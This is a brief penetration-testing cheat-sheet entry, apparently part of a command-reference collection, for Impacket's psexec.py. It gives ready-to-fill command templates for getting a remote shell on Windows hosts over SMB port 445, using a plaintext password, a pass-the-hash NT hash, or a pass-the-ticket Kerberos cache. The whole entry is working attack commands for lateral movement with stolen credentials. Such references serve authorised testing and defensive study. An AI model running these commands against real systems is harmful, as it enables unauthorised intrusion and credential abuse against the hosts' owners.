# psexec (imp)

%  windows, impacket-exec, RemComSvc

## username
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
create a new service (using \pipe\svcctl via SMB)

```
psexec.py '<domain>'/'<user>':'<password>'@<ip>
```

## pth
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
create a new service (using \pipe\svcctl via SMB)

```
psexec.py -hashes :<nt_hash> <user>@<ip>
```

## ptt
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
create a new service (using \pipe\svcctl via SMB)

```
export KRB5CCNAME=<ccache>; psexec.py -dc-ip <dc_ip> -target-ip <ip> -no-pass -k <target_name>
```

